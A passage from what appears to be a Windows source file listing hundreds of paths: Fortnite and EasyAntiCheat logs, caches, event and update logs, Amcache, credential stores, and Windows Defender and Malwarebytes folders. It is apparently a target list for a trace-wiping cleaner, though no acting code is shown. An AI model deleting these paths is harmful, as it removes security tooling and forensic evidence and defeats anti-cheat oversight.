            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\ProgramData\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Nvidia",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository",
            "C:\\Users\\"+ user +"\\AppData\\Local\\AMD\\DxCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\slideshow.ini",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\PerfLogs\\collections.dat",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.0.regtrans-ms",
            "C:\\ProgramData\\Microsoft\\Diagnosis",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Windows\\SoftwareDistribution\\ReportingEvents.log",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\History",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\$resumeData",
            "C:\\Program Files\\rempl\\Logs",
            "C:\\Windows\\SoftwareDistribution\\ReportingEvents.log",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\Windows\\System32\\LogFiles\\WMI\\Wifi.etl",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository",
            "C:\\Windows\\INF\\WmiApRpl\\WmiApRpl.ini",
            "C:\\Windows\\System32\\PerfStringBackup.TMP",
            "C:\\Windows\\System32\\PerfStringBackup.INI",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir",
            "C:\\Windows\\WinSxS\\ManifestCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe",
            "C:\\Windows\\Logs\\CBS",
            "C:\\Windows\\Logs\\WindowsUpdate",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\FontCache",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Windows\\System32\\LogFiles\\WMI\\Wifi.etl",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.0.regtrans-ms",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.1.regtrans-ms",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.2.regtrans-ms",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.blf",
            "C:\\Windows\\System32\\SleepStudy",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\AMD",
            "C:\\Windows\\System32\\DriverStore\\en-US",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Windows\\System32\\drivers\\etc\\protocol",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\Windows\\appcompat\\appraiser\\AltData",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\Windows\\system32\\dllcache",
            "C:\\Windows\\System32\\wbem\\Repository",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\AppCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Windows",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\d3dcompiler_43.dll",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\d3dcompiler_47.dll",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\libcef.dll",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\libEGL.dll",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\libGLESv2.dll",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\CEF3",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\NVIDIA",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\Ogg\\Win64\\VS2015\\libogg_64.dll",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\Ogg\\Win64\\VS2015",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\Engine\\Binaries\\ThirdParty\\PhysX3\\Win64\\VS2015\\ApexFramework_x64.dll",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Logs",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\ConnectedDevicesPlatform",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Dlna\\DeviceIcons",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\CLR_v2.0\\UsageLogs",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Program Files x86\\Epic Games\\Launcher\\VaultCache",
            "C:\\Program Files x86\\Epic Games\\Launcher\\Engine\\Programs\\CrashReportClient\\Config\\DefaultEngine.ini",
            "C:\\ProgramData\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Caches",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\ProgramData\\Package Cache",
            "C:\\ProgramData\\Microsoft\\Windows\\Caches",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache",
            "C:\\Program Files x86\\Microsoft.NET\\Multi-Targeting Pack\\v4.5.1\\SetupCache",
            "C:\\Program Files x86\\Microsoft.NET\\Multi-Targeting Pack\\v4.5.2\\SetupCache",
            "C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Cache",
            "C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{CC288659-A1DB-4AEC-BAB2-6DBB6A99ABE8}",
            "C:\\Users\\All Users\\Microsoft\\Windows Defender\\Definition Updates\\{CC288659-A1DB-4AEC-BAB2-6DBB6A99ABE8}",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngine",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat",
            "C:\\Windows\\System32\\WDI",
            "C:\\Windows\\System32\\WDI\\{533a67eb-9fb5-473d-b884-958cf4b9c4a3}\\{1b3f1407-39d0-4a4f-a547-cd4c65d17116}",
            "C:\\Windows\\System32\\WDI\\{533a67eb-9fb5-473d-b884-958cf4b9c4a3}\\{ed1e579f-1b61-4367-9430-f55c00c26870}",
            "C:\\Windows\\SoftwareDistribution\\Download\\Install",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Resource-Exhaustion-Resolver%4Operational.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PriResources-Deployment%4Operational.evtx",
            "C:\\Windows\\System32\\WDI\\LogFiles\\WdiContextLog.etl.002",
            "C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA",
            "C:\\Windows\\System32\\wbem\\Repository\\MAPPING3.MAP",
            "C:\\Windows\\System32\\wbem\\Repository\\MAPPING2.MAP",
            "C:\\Windows\\System32\\wbem\\Repository\\MAPPING1.MAP",
            "C:\\Windows\\System32\\wbem\\Repository\\INDEX.BTR",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator\\Backup Scan",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache",
            "C:\\Windows\\System32\\drivers\\mbamswissarmy.sys",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\catroot2\\dberr.txt",
            "C:\\Windows\\System32\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\MBAMSwissArmy.cat",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive0.dat",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG1",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Intel\\DPTF\\dptf.dv",
            "C:\\Windows\\security\\logs",
            "C:\\Windows\\security\\logs\\scecomp.log",
            "C:\\Windows\\Logs\\CBS\\CBS.log",
            "C:\\Windows\\Logs\\NetSetup\\service.0.etl",
            "C:\\Windows\\Logs\\WindowsUpdate\\WindowsUpdate.20190526.072128.021.3.etl",
            "C:\\Windows\\bootstat.dat",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\js_logs",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\The Internet.lnk",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\AccountPictures\\8495ae10deeaf929.accountpicture-ms",
            "C:\\Users\\"+ user +"\\AppData\\Local\\ProtonVPN\\ProtonVPN.exe_Url_5k5woeau2v3gmtlay4mjwsftlqxjnn2p\\1.8.1.0\\user.config",
            "C:\\Users\\"+ user +"\\AppData\\Local\\ProtonVPN\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC\\Microsoft\\CryptnetUrlCache\\MetaData\\FB0D848F74F70BB2EAA93746D24D9749",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC\\Microsoft\\CryptnetUrlCache\\MetaData\\57C8EDB95DF3F0AD4EE2DC2B8CFD4157",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\LocalState\\HxStore.hxd",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\LocalState\\HxStore.hxd",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\signals\\collection\\WIFI\\{a70e087b-499b-4632-ad5d-4b1c6d71e648}",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Graph\\Login.ttl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Graph\\49ccf8c88be99e2b\\Me\\00000000.ttl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Grammars\\VaStartMenu_01.0409.digest.bin.tmp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Grammars\\VaStartMenuGames_01.0409.digest.bin.tmp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Grammars\\PointsOfInterest_01.0409.digest.bin.tmp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Grammars\\PointsOfInterest2_01.0409.digest.bin.tmp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\SkypeRT\\persistent.conf",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\DiagOutputDir\\SkypeApp0.txt",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\CS_localstate\\CS_shared.conf",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\AsyncStorage\\saveUlLog.data",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\AsyncStorage\\FirstTimeSignIn.data",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\AsyncStorage\\ecsDefaultConfig.data",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\TokenBroker\\Cache\\0c55efda7496e58ee00d3d8c9b78994f9ee0359c.tbres",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UPPS\\UPPS.bin",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\NotifyIcon\\Microsoft.Explorer.Notification.{856ABD34-82E0-98F4-3351-225E04F0D828}.png",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\NotifyIcon\\Microsoft.Explorer.Notification.{856ABD34-82E0-98F4-3351-225E04F0D828}.png",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Credentials\\5003A98EAE20BC3E53D43ADBDDEDBA4E",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Visited Links",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\cef3.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\cef3.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\ConnectedDevicesPlatform\\49ccf8c88be99e2b\\ActivitiesCache.db-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\ConnectedDevicesPlatform\\49ccf8c88be99e2b\\ActivitiesCache.db",
            "C:\\Users\\All Users\\USOPrivate\\UpdateStore\\updatestore51b519d5-b6f5-4333-8df6-e74d7c9aead4.xml",
            "C:\\Users\\All Users\\Synaptics\\ValidityService.log",
            "C:\\Users\\All Users\\ProtonVPN\\Logs\\service.txt",
            "C:\\Users\\All Users\\Microsoft\\Windows Defender\\Support\\MPLog-20190520-222511.log",
            "C:\\Users\\All Users\\Microsoft\\Windows Defender\\Scans",
            "C:\\Users\\All Users\\Microsoft\\Windows Defender\\Definition Updates\\Backup",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository",
            "C:\\Users\\All Users\\Microsoft\\SmsRouter\\MessageStore",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edbtmp.jtx",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jtx",
            "C:\\Users\\All Users\\Microsoft\\Network\\Downloader",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis",
            "C:\\Users\\All Users\\Malwarebytes",
            "C:\\Users\\All Users\\Malwarebytes\\MBAMService",
            "C:\\Users\\All Users\\Malwarebytes\\MBAMService\\config",
            "C:\\ProgramData\\USOPrivate\\UpdateStore\\updatestore51b519d5-b6f5-4333-8df6-e74d7c9aead4.xml",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Support",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Program Files\\Malwarebytes",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Containers-Wcnfs%4Operational.evtx",
            "C:\\Windows\\System32\\WDI\\{533a67eb-9fb5-473d-b884-958cf4b9c4a3}\\{ed1e579f-1b61-4367-9430-f55c00c26870}\\snapshot.etl",
            "C:\\Windows\\System32\\WDI\\{533a67eb-9fb5-473d-b884-958cf4b9c4a3}\\{1b3f1407-39d0-4a4f-a547-cd4c65d17116}\\snapshot.etl",
            "C:\\Windows\\System32\\sru",
            "C:\\Windows\\System32\\SleepStudy",
            "C:\\Windows\\System32\\SleepStudy",
            "C:\\Windows\\SoftwareDistribution\\Download\\Install",
            "c:\\Windows\\SoftwareDistribution\\DataStore\\Logs,,,",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\FontCache",
            "C:\\Windows\\Logs\\WindowsUpdate\\WindowsUpdate.20190526.072128.021.4.etl",
            "C:\\Windows\\Logs\\waasmedic\\waasmedic.20190526_063337_646.etl",
            "C:\\Windows\\Logs\\WindowsUpdate",
            "C:\\Windows\\Logs\\waasmedic",
            "C:\\Users\\Public\\ASR.dat",
            "C:\\Users\\Public",
            "C:\\Users\\"+ user +"\\js_logs\\2019-05-26-10.txt",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat\\gamelauncher.log",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat\\217",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Logs\\FortniteGame.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Demos",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngine",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache\\microsoft-explorer-notification--856abd34-82e0-98f4-3351-225e04f0d828-_489_0.png",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\TokenBroker\\Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache",
            "C:\\Users\\All Users\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424_COM15.dat.LOG2",
            "C:\\Users\\All Users\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424_COM15.dat.LOG1",
            "C:\\Users\\All Users\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424_COM15.dat",
            "C:\\Users\\All Users\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424.dat",
            "C:\\Users\\All Users\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424.dat",
            "C:\\Users\\All Users\\Microsoft\\Windows Defender\\Definition Updates",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb00194.jtx",
            "C:\\ProgramData\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424_COM15.dat.LOG2",
            "C:\\ProgramData\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424_COM15.dat.LOG1",
            "C:\\ProgramData\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424_COM15.dat.LOG1",
            "C:\\ProgramData\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache\\5c8cbb6aa7ea1424.dat",
            "C:\\ProgramData\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common",
            "C:\\ProgramData\\Microsoft\\Network\\Downloader",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\CacheStorage",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG1",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
